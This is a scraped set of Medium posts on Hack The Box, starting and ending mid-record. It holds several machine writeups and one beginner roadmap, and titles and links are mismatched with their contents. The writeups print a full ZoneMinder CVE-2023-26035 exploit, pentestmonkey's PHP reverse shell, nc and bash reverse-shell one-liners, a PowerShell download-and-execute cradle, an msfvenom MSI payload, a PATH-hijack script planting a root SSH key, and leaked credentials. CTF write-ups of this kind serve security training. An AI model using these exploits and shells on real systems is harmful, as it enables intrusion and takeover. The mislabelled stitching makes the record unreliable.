presented with a ZoneMinder login page.\nLike any great hacker would do next I googled for any exploits out there available for ZoneMinder and came across yet another RCE-related exploit.\nsudo git clone https://github.com/rvizx/CVE-2023-26035cd CVE-2023-26035nc -nlvp 7777python3 exploit.py -t http://127.0.0.1:2222/ -i <your Attacker IP here> -p 7777\nLet’s break down this exploit code also:\nimport reimport requestsfrom bs4 import BeautifulSoupimport argparseimport base64# CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)class ZoneMinderExploit:    def __init__(self, target_uri):        self.target_uri = target_uri        self.csrf_magic = None    def fetch_csrf_token(self):        print(\"[>] fetching csrt token\")        response = requests.get(self.target_uri)        self.csrf_magic = self.get_csrf_magic(response)        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\\d+', self.csrf_magic):            print(f\"[>] recieved the token: {self.csrf_magic}\")            return True        print(\"[!] unable to fetch or parse token.\")        return False    def get_csrf_magic(self, response):        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)    def execute_command(self, cmd):        print(\"[>] sending payload..\")        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}        response = requests.post(f\"{self.target_uri}/index.php\", data=data)        print(\"[>] payload sent\" if response.status_code == 200 else \"[!] failed to send payload\")    def exploit(self, payload):        if self.fetch_csrf_token():            print(f\"[>] executing...\")            self.execute_command(payload)if __name__ == \"__main__\":    parser = argparse.ArgumentParser()    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')    parser.add_argument('-p', '--port', required=True, help='port')    args = parser.parse_args()    # generating the payload    ps1 = f\"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1\"      ps2 = base64.b64encode(ps1.encode()).decode()    payload = f\"echo {ps2} | base64 -d | /bin/bash\"    ZoneMinderExploit(args.target_url).exploit(payload)\nThis Python script is an exploit for (CVE-2023–26035), which is an unauthenticated Remote Code Execution (RCE) vulnerability in ZoneMinder Snapshots.\n* The script imports necessary modules: re for regular expressions, requests for making HTTP requests, BeautifulSoup from the bs4 library for parsing HTML, argparse for parsing command-line arguments, and base64 for encoding payloads.\nZoneMinderExploit Class:\n* This class encapsulates the exploit logic:\n* The __init__ method initializes the target URI and CSRF token.\n* The fetch_csrf_token method sends a GET request to the target URI to fetch the CSRF token from the HTML response.\n* The get_csrf_magic method parses the HTML response to extract the CSRF token.\n* The execute_command method sends a POST request with a payload to execute arbitrary commands on the target.\n* The exploit method orchestrates the exploit by fetching the CSRF token and executing the payload.\nPayload Generation:\n* The script parses command-line arguments to obtain the target URL, local IP, and port.\n* It generates a payload (ps1) that establishes a reverse shell connection to the specified local IP and port using bash.\n* The payload is encoded using base64 (ps2), and a final payload is constructed to decode and execute the payload using base64 and bash.\nCommand-Line Argument Parsing:\n* The script uses argparse to parse command-line arguments, expecting the target URL, local IP, and port.\nExploit Execution:\n* The script instantiates the ZoneMinderExploit class with the target URL and calls the exploit method, passing the generated payload.\n* The exploit fetches the CSRF token and then executes the payload to establish a reverse shell on the target system.\nThe first thing I always do and I mean always is run sudo -l .\nThis had me chasing my tail for a while and had no idea how to abuse this. Eventually, I decided to look in the /usr/bin directory for all zm related scripts and found zmupdate.pl .\nDid some reverse engineering on this file and saw that the user= argument parameter was vulnerable to an injection attack. So I ran the file passed my injection to the user argument and got a shell as root!\nsudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023\nThe shell was super buggy and couldn't run anything as root so I did another reverse shell back onto my machine and got a stable shell.\nOn the target machine after running the exploit:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 3333 >/tmp/f"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-2-13fa9db6a2d2",
        "content": "In our previous Hack The Box in-person meetups in Lisbon and Oporto I had the opportunity of presenting HTB in all its splendor. We talked about #hackthebox history, what hacking is, where to start, how to learn, and the importance of the community.\nThe response was overwhelming. It was amazing to get together with experienced professionals and newcomers, we created an environment where everyone felt supported and welcomed.\nHTB Meetup — Lisbon\nHTB Meetup — Oporto\nFollowing these last couple of events, I got a lot of requests to suggest a kind of “roadmap” for those complete beginners in hacking and HTB.\nI decided to write a couple of articles suggesting my approach to HTB and hacking. Take these and they are, personal and subjective. This aims to be a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking that is.\nThis is the first part of our convo. I’ll be covering HTB Academy and leave you with a cliffhanger.\nI’m not going to talk about what is hacking. As we presented on our meetup r0adrunn3r from HTB did that in a stellar way in her impressive How to learn hacking: The (step-by-step) beginner’s bible for 2023.\nhackthebox.com/blog/learn-to-hack-beginners-bible\nStart here:\nThat’s the place to start if you’re a complete beginner. Start there and read it. Get fundamental answers for questions like:\n* What is hacking?\n* Can anyone learn how to hack?\n* Where should beginner hackers start? and many more.\nThe article is written in a way that’s informative and makes you feel welcomed and supported. She even discusses the hats hackers should be wearing. If you know me you know my take on that:\nhttps://www.hackthebox.com/blog/htb-community-manifesto , slide from HTB — Lisbon meetup\nRead the Community Manifesto:\nHTB is all about the importance of the community. A happy, non-toxic, open, educational, active, and passionate society for hackers.\nIt’s our ultimate responsibility to ensure our values. Promote respect and a safe place. We all are learners, we all struggle from time to time. In such a highly demanding field as cybersecurity, it’s essential to foster a helpful and supportive community. That’s the only way to grow and learn.\nTalk about learning:\nLearning in everything. This journey is above all about learning. So having a mindset where acquiring knowledge is your reward will help you in the long run.\nYou’ve seen the memes:\nGot this from a web search, there was no explicit author.\nI bet you can do the splits, but even Jean Claude Van Damme didn’t skip the fundamentals. Why should you?\nFundamentals! Fundamentals! Fundamentals! — HTB Academy\nThat’s right. Start learning now. Start with the fundamental cybersecurity skills. This is the beginning of your journey into hacking and the world of cybersecurity. Make sure you start with the proper foundations.\nCreate an account on Hack The Box Academy, this is without a doubt the perfect place for you to start. From complete beginners to seasoned professionals I can guarantee you that this is a resource you’ll be using throughout your career.\nHTB — Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. Where should you start?\nHacker meets HTB — Academy, HTB — Academy this is hacker:\nGet acquainted with the platform and the learning process. This module will welcome you and guide you at the beginning of your learning journey at the Academy. Think of this as the tutorial stage of your favorite game.\nGot it! What’s next?\nLearn how to learn — the starting module:\nLearning Process created by Cry0l1t3\nIn this demanding and ever-changing field, prepare yourself for neverending study. Having methodologies and processes will not only optimize your learning but ensures your mental safety. Protect yourself from burnout, impostor syndrome… Be prepared. The amount of information can be overwhelming when you first start so you must keep yourself organized. Also, frustration is going to creep up on you, better be prepared to deal with it.\nTake notes:\nThat reminds me. Always take notes! I mean ALWAYS (yea, all caps). Start now, make it a habit. Take notes now, while learning. Take notes later, while hacking. This will not only improve your concept retention but you’ll be creating your knowledge base you can always refer to.\nChoose a note-taking app and start now:"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-1-994033ac3a6f",
        "content": "Love is an easy Windows box created by pwnmeow on Hack The Box and was released on the 1st of May 2021. Hello world, welcome to Haxez where today I will explain how I hacked Love. To hack this box is it recommended that you have Windows enumeration and web enumeration skills. From hacking this box, you will learn exploit modification, server-side request forgery, applocker policies, and always install everything misconfiguration.\nLove Enumeration\nAfter spawning the box, I sent a single ping request to ensure it was online. I then followed up with a Nmap scan targeting all ports, requesting service versions, and running default scripts. Finally, I gave it a minimum packet rate of 10000 and said to output all formats. From the results, I learnt that there were several ports open. This included various ports for HTTP, 445 for SMB, 3306 for MySQL, 5985 and 5986 for HTTPAPI or WinRM, the list goes on.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nmap -sC -sV -p- 10.129.48.103 --min-rate 10000 -oA love\nAs SMB was listening, the first thing I did was run crackmapexec to enumerate shares and host information. From the results, I learnt that it was a Windows 10 Pro box with the hostname LOVE. The domain was also called Love which suggests the box is not a domain controller (as they have the same name). Furthermore, SMBv1 was enabled.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ crackmapexec smb 10.129.48.103\nLove Web Application Enumeration\nAfter poking SMB, I went to take a look at the web application. First, I visited the application in my browser and saw that it was a type of voting application. Next, I appended various extensions to the end of the index page. As a result, I learnt that the application was written in PHP.\nFollowing that, I ran whatweb against the application and learnt that the PHP version was 7.3.27. Furthermore, I also learnt that the Apache version was 2.4.46 and that the application was using the Bootstrap framework.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo whatweb -a3 http://10.129.48.103/ -v\nI also ran a gobuster scan to try to identify any directories or files that would disclose sensitive information about the application. However, other than some 301 and 302 redirections and a bunch of 403 errors, I didn’t find much.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ gobuster dir -u http://10.129.48.103/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt,bak -o gobuster.love.txt\nMore Love Application Enumeration\nI decided to look at the other HTTP ports that were discovered during the Nmap scan. Therefore, I punched the IP address of the box into my browser and specified port 5000. Immediately, I received a Forbidden error. I shouldn’t have been surprised by this as Nmap displayed the forbidden error in the results.\nSubdomains and Virtual Hosts\nI revisited the results of the Nmap scan to choose which service to poke at next. It was then that I noticed the common name of the SSL certificate on port 443. Below, you can see the output from the Nmap scan showing the subdomain of staging.love.htb.\nImmediately, I excitedly added the IP address and new subdomain to my host file. Surely this was the foothold that I’d been looking for. Finally, I found a weakness in this box’s armour! I entered the domain into my browser and…. Forbidden. Wow, talk about rejection.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ echo '10.129.48.103 staging.love.htb' | sudo tee -a /etc/hosts\nHowever, visiting the subdomain via HTTP instead of HTTPS loaded a page. I poked around the application for a bit and noticed a demo page. In short, the demo page is a free file scanner that allows the user to submit a URL with a file for scanning.\nServer-Side Request Forgery\nI wanted to see if the demo page worked so I set up a netcat listener on my local machine. Next, I input the location of a file into the Scan File input box and sent the request. Sure enough, the application pulled the file down from my host and displayed the contents. Admittedly, my first thought was to try and get it to execute a payload by downloading it from my host. However, those attempts failed.\nThere is a Web Application vulnerability known as Server Side Request Forgery. In short, SSRF exploits the box’s own trust. Because the resource request is sent from the box itself, it may allow access to otherwise forbidden files. To illustrate, I input the loopback address of 127.0.0.1 followed by port 5000 into the URL box. This was the page I was previously unable to access. Upon sending the request, I received credentials.\nVoting System Admin\nWith the username and password successfully stolen via SSRF, I headed back to the voting system by navigating to the IP address. Next, I supplied the stolen credentials and… they didn’t work. This is another one of those easy boxes which seems more difficult than it is because it takes so long.\nFortunately, I ran a gobuster earlier and remember seeing a 301 redirection from /admin to /admin/. This is where gobuster attempted to load a file called admin but was redirected to a directory called admin, likely containing a PHP file. Therefore, I headed to the admin directory and was able to log in with the credentials.\nLove RCE POC\nI noticed the Copyright disclaimer at the bottom of the page and decided to perform a Google search for the name SourceCodeStar. After a few Google searches, I stumbled upon several Exploit Database pages which suggested there was an authenticated remote code execution. Unfortunately, there didn’t appear to be a CVE number associated with it.\nAdmittedly, I wanted some guidance on this step so I am going to copy what IppSec did >>HERE<<. First, I navigated to the Voters menu option and clicked the New button. This spawned the window you see below. I populated the window with some test data and selected a jpeg file for the photo.\nNext, I turned intercept on and clicked the save button. Burp successfully intercepted the request which I then modified. I changed the filename to “haxez.php” and then removed the jpeg data and replaced it with a PHP web shell.\n------WebKitFormBoundaryM93O7d6XpEp6S0dPContent-Disposition: form-data; name=\"photo\"; filename=\"haxez.php\"Content-Type: image/jpeg<?php system($_REQUEST[\"cmd\"]); ?>\nThen, I navigated to the payload in my browser and passed the dir command to the cmd parameter. It successfully listed out the contents of the directory.\nLove Foothold\nNow that I had command execution, it was time to get on the box using a reverse shell. I downloaded nishang from >>HERE<< and copied the Invoke-PowerShellTcpOneLine.ps1 payload to my current working directory. Next, I opened the payload with VIM and changed the IP address and port to my tun0 IP address and port 9001.\nThen, I sent my original directory listing request to Burp repeater and changed the request method to a POST. Next, I started a netcat listener and then added the following Payload to Burp and sent the request. I instantly received a 404 error. There must be a clean-up script on the box that is removing the payloads.\ncmd=powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/hax.ps1')\"\nI quickly repeated the process by uploading a new command shell and executing the above payload. Finally, I got a reverse shell and had a foothold on the box. From here, I was able to grab the user flag from the phoebe users desktop directory.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9001                                             [sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59730PS C:\\xampp\\htdocs\\omrs\\images> whoamilove\\phoebePS C:\\xampp\\htdocs\\omrs\\images> type C:\\Users\\phoebe\\Desktop\\user.txtd85▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓319\nLove Privilege Escalation\nAfter capturing the user flag, I download the latest version of the 64 bit obfuscated WinPEASS binary. Next, I spawn a Python3 web server and used cURL to download the binary to the target machine. Finally, I ran the executable and saw that the AlwaysInstallElevated value was set to 1 which I presume means it was enabled. Quoting directly from the HackTricks article “If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\\SYSTEM.”. Is this a useful setting to have as a sysadmin? it seems a bit odd.\nWith this knowledge, I went back to my Linux terminal and used msfvenom to create an MSI payload. The output below will create a Windows x64 reverse shell that connects back to my local host on port 9002. The file type is specified as an MSI file and I saved the output to payload.msi.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi\nI set up a netcat listener to listen on port 9002 and then used cURL to download the payload from the Python web server I still had running. I specified the -o flag to save the payload as payload.msi.\nPS C:\\users\\public\\documents> curl http://10.10.14.36/payload.msi -o payload.msiPS C:\\users\\public\\documents> .\\payload.msi\nFinally, I ran the payload and thankfully, I received a connection back to the netcat listener. I now had a reverse shell as the nt authority\\system user and could finally capture the root flag.\n──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9002                                           [sudo] password for kali: listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59734Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>type \\users\\administrator\\desktop\\root.txttype \\users\\administrator\\desktop\\root.txt64b▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓95f\nLove Learnings\nLove requires patience… the initial enumeration stage of this box took longer than I had hoped. It felt like I was jumping through hoops but it taught me valuable lessons about enumeration. It’s one of those boxes that seemed difficult due to the level of enumeration required to get a foothold, but the actual exploit is easy. Furthermore, it does a great job of demonstrating Server Side Request Forgery which I hadn’t really done before.\nThe privilege escalation was a lot of fun and fairly simple to pull off. I didn’t know about this method of privilege escalation until today so I’ve learnt that too. Overall it’s a fun box but it definitely tested my patience at times. My initial PHP shell just up and vanished so I had to upload that again before getting my reverse shell. For me, it was educational and taught me new techniques which is what I want from an easy box. Thanks for the box."
    },
    {
        "title": "Hack The Box Writeup Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-writeup-writeup-338083ef9057",
        "content": "Let me give you a little breakdown of that this ruby code is doing:\n* Shebang Line: The script starts with a shebang line (#!/usr/bin/env ruby), indicating that it should be executed using the Ruby interpreter.\n* Exploit Information: The code includes comments that provide details about the exploit, such as its title, author, CVE identifier, and references to relevant websites and sources related to the vulnerability.\n* Required Libraries: The script requires several Ruby libraries, including json, httpx, docopt, and paint, which are used for various purposes, such as handling JSON data, making HTTP requests, parsing command-line arguments, and displaying colored output.\n* Docopt Usage and Options: The script defines a docopt usage section, which describes how to use the script and its command-line options. It specifies the required argument <url> and optional options like — debug, — no-color, and -h or — help.\n* Functions: The script defines several functions to perform specific tasks:\nfetch_users, parse_users, and display_users: These functions fetch and display information about Joomla! users from a given URL.fetch_config, parse_config, and display_config: These functions fetch and display configuration information about the Joomla! site.Main Execution Block: In the main part of the script, it:\n* Parses command-line arguments using docopt.Sets the display mode for colored output based on the — no-color option.Calls the functions to retrieve and display user and configuration information from the Joomla! site specified in the command-line argument.\n* Error Handling: The script includes basic error handling using begin and rescue blocks to catch and display any Docopt::Exit exceptions.\nIn summary, this Ruby script is designed to exploit a specific vulnerability in Joomla! (< 4.2.8) that allows unauthenticated users to disclose information about Joomla! users and site configuration. It retrieves and displays this information from the specified Joomla! site URL. It also provides command-line options for customization and error handling.\ngem install httpx docopt paintruby exploit.rb http://dev.devvortex.htb\nThe exploit puked out the user Lewis along with his password ;).\nDB user: lewisDB password: P4ntherg0t1n5r3c0n##\nI tried ssh with the creds and no luck so I moved on to the joomla admin interface on the web and was able to login as lewis.\nI googled authenticated attacks. I can perform on Jommla to get a shell, and reading back at the hacktricks article, you can target the templates to get a PHP reverse shell.\nUsing the pentestmonkey’s shell, I had to edit the code and add my IP address where it says “CHANGE THIS”.\n<?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = \"1.0\";$ip = '127.0.0.1';  // CHANGE THIS$port = 1234;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) {  printit(\"ERROR: Can't fork\");  exit(1); } if ($pid) {  exit(0);  // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) {  printit(\"Error: Can't setsid()\");  exit(1); } $daemon = 1;} else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}// Change to a safe directorychdir(\"/\");// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\"); exit(1);}// Spawn shell process$descriptorspec = array(   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) { // Check for end of TCP connection if (feof($sock)) {  printit(\"ERROR: Shell connection terminated\");  break; } // Check for end of STDOUT if (feof($pipes[1])) {  printit(\"ERROR: Shell process terminated\");  break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) {  if ($debug) printit(\"SOCK READ\");  $input = fread($sock, $chunk_size);  if ($debug) printit(\"SOCK: $input\");  fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) {  if ($debug) printit(\"STDOUT READ\");  $input = fread($pipes[1], $chunk_size);  if ($debug) printit(\"STDOUT: $input\");  fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) {  if ($debug) printit(\"STDERR READ\");  $input = fread($pipes[2], $chunk_size);  if ($debug) printit(\"STDERR: $input\");  fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) { if (!$daemon) {  print \"$string\\n\"; }}?>\nI edited the following template in error.php:\nSet up a netcat listener on my attack machine:\nnc -lvp 1234"
    },
    {
        "title": "Hack The Box Love Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-love-writeup-d58982ffa4ec",
        "content": "Writeup is an easy Linux box created by jkr on Hack The Box. The box has protections in place to prevent brute-force attacks. The skills required to complete this box are enumeration. The skills obtained from completing this box are process enumeration and path hijacking. Hello world, welcome to Haxez where today I will be explaining how I hacked the Hack The Box Writeup box.\nEnumerating Writeup\nFirst, I spawned the box and connected my attack box to the Hack The Box lab VPN. Next, I sent a ping to the target to ensure it was online and that I could talk to it. Once the box responded, I performed a Nmap scan targeting all ports. Furthermore, I also requested service versions, told it to run default scripts, gave it a minimum packet rate of 10,000, and told it to save the output in all formats named writeup. As you can see from the screenshot below, ports 22 for SSH and 80 for HTTP were open.\nsudo nmap -sC -sV -p- 10.129.95.203 --min-rate 10000 -oA writeup\nWeb Application Enumeration\nSince SSH was unlikely to be the intended attack vector, I moseyed on over to the web application for a gander. It’s… beautiful! The web application appeared to be an in-development blog for Hack The Box writeups. However, the application was being hit with denial-of-service attacks resulting in DoS protection mechanisms being implemented. The DoS protection blocks any IP that triggers a 400 error in the Apache log.\nDomo arigato, Mr Roboto\nDirb, gobuster, ffuf, and other directory and file brute force tools are noisy and would generate 400 errors resulting in an IP ban. Therefore, I had to manually and carefully enumerate the web application. One of the first files I look for when hacking web applications is the robots.txt file. It’s a file that tells search indexing robots to ignore the files contained within it. It prevents pages like admin or log-in from being indexed. However, it’s a double-edged sword as it may disclose sensitive information to malicious threat actors. Navigating to the robots.txt file I found a directory called writeup.\nEnumerating Writeup Technologies\nI navigated to the writeup directory which presented a basic web application with minimal functionality. There were several links to blog posts and clicking on those blog posts revealed that it was a PHP-based application. Furthermore, a parameter named page was being used to retrieve the blog posts. For example, visiting the following URL would retrieve a blog post called blue http://10.129.95.203/writeup/index.php?page=blue. I used whatweb to identify the CMS or Content Management System. As a result, I learned that it was using a version of CMS-Made-Simple from 2004–2019.\nFurthermore, looking at the structure of the CMS I found the location of the changelog file. Navigating to the file revealed the specific version of the CMS being used.\nCMS Made Simple Blind SQL Injection Failures\nUsing searchsploit to search for vulnerabilities impacting CMS Made Simple, I found a blind SQL injection vulnerability. The vulnerability has a CVE designation of CVE-2019–9053. I located the Python script and copied it to my current working directory. You can do this with the searchsploit -m flag to mirror it.\nUnfortunately, attempting to run this exploit produced errors regarding print statements. I wasn’t sure what to do here as I’m crap at Python. Fortunately, IppSecs video explained that I needed to install the termcolor module with pip. While this didn’t resolve the problem, it did point me in the right direction.\nFirst, I had to install pip2.7 which I was able to do by following the post >>HERE<<\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2.7 get-pip.py\nHowever, when attempting to install termcolor, I received errors about an egg or something. After a bit more Google searching, I found this post >>HERE<< which explained I needed to upgrade setuptools.\npip install --upgrade setuptools\nCMS Made Simple Blind SQL Injection Success\nI was finally ready to run the payload. Using the following command, I was able to attack the SQL injection vulnerability and retrieve a salt, username, email address, and password hash. It was awesome watching the script come alive and iterate through the alphabet and pull the information out of the database.\npython2.7 46635.py --url http://10.129.95.203/writeup\nWriteup Foothold\nI echoed the hash followed by a colon, followed by the salt into a file called jkrhash.txt.\necho '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > jkrhash.txt\nNext, I used hashcat with mode 20 (MD5 salt and password) to crack the hash with the wordlist rockyou.\nhashcat -a 0 -m 20 jkrhash.txt /usr/share/wordlists/rockyou.txt\nI was in, I was able to use the credentials to SSH to the box as the jkr user. Furthermore, once on the box, I was able to capture the user flag.\njkr@writeup:~$ cat user.txt8d0▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓9e9\nWriteup System Enumeration\nAfter grabbing the user flag, I started enumerating the system. First, I checked the command history of the jkr user to see if it contained anything interesting. It didn’t. Next, I checked if I could run sudo -l to see what commands jkr could run as sudo. Interestingly, sudo wasn’t found on the system. Finally, I decided to go for the easy option and ran linpeas. I span up a Python webserver and used wget to download it to the /tmp directory. Then, I gave it executable permissions and ran it.\nThe output kept highlighting the /usr/local path as a privilege escalation vector but I didn’t know why. After a bit more investigation, it seems that the jkr user is part of the staff group. According to the Debian wiki the staff group allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may “override” the executables in /bin and /usr/bin with the same name). As you can see from the screenshot below, /usr/local/bin is also the first path that gets called when executing files.\nWriteup Process Enumeration\nI’m still getting my head around this privilege escalation method if I’m honest. However, I think I understand it. To explain, the jkr user is a member of the staff group and the staff group has the ability to modify /usr/local/ without root privileges. If I can find a binary that gets executed as root without it using the absolute file path, then I can drop a malicious binary of the same name inside the /usr/local/bin directory. Then, when the conditions are met for the binary to be executed, my malicious binary gets executed with root privileges because my first environmental path is /usr/local/bin.\nWith that in mind, I ran pspy32 and found that when I log in to SSH with jkr, the run-parts binary is executed without an absolute file path. You can see it in the image below, the third blue line from the bottom.\nNext, I checked to see the ownership of the run-parts binary to see if it was owned by root. I used which to locate it and then ran ls -lash to list the permissions. Sure enough, it was owned by root and genuinely appeared to be the only binary not being executed with a full file path.\nWriteup Privilege Escalation\nIn theory, I should now be able to create my own binary or script called run-parts in /usr/local/bin. Then when I SSH to the system as jkr, my malicious run-parts binary will be executed instead of the one in /bin. There are multiple methods that I could have used to do this. For example, I could have created a script that copied the bash binary to /tmp and gave it setuid capabilities (I think). Additionally, I could have created a reverse shell that connected back to my machine. However, I thought the most reliable method was to drop an SSH key in the root user’s authorized_keys file. Plus, this is the method that IppSec used and it seemed to work.\nWhen the script is executed, it creates a file in /tmp called Exploit-Complete. This isn’t required as it’s just a visual indicator to show that the script was executed. Next, it creates the .ssh directory in the root user’s directory. Then, it echos my public key into the root user’s authorized_keys file. Finally, it gives the file 600 permissions. The script is saved as run-parts and saved to /usr/local/bin. I created it using nano.\n#!/bin/bashtouch /tmp/Exploit-Completemkdir /root/.sshecho 'ssh-rsa AAAA <<<SNIP>>> QqNzw9WKiU0= kali@kali' >> /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys\nOnce the file was saved, I made it executable by running chmod +x against it. Then I created a new terminal tab and connected back to the box as the jkr user. I checked the /tmp directory and sure enough, the Exploit-Complete file had been created. Hopefully, that means that my public key is now in the root user’s authorized_keys files.\nFinally, I connected SSH as the root user using the private key I generated. I was able to login and grab the root flag.\n┌──(kali㉿kali)-[~/HTB/Writeup]└─$ ssh -i root root@10.129.95.203Last login: Fri Aug  6 08:59:19 2021root@writeup:~# cat root.txt786▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓4b4\nWriteup Learnings\nThis was a fun box which I learned a few things from. The first was getting the Python SQL injection payload to work. As soon as I received that first error I immediately thought that I wasn’t going to be able to complete the box. However, after a bit of persistence, the payload worked and left me with a big grin on my face. The cracking was fairly simple but always good to get some practice.\nThe system enumeration and privilege escalation was interesting. I didn’t know about the staff group before and without guides pointing me in the right direction, I wouldn’t have got it. I’m starting to understand the brilliance of pspy too, without it, I’m not sure how I would have identified the correct binary. Overall this is a good box and has a nice method for practicing different techniques for privilege escalation. You could change your binary to perform different things and then easily trigger it by connecting back to the box. Thanks, jkr, fun box."
    },
    {
        "title": "Hack The Box Horizontall Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-horizontall-writeup-4f10ec21a949",
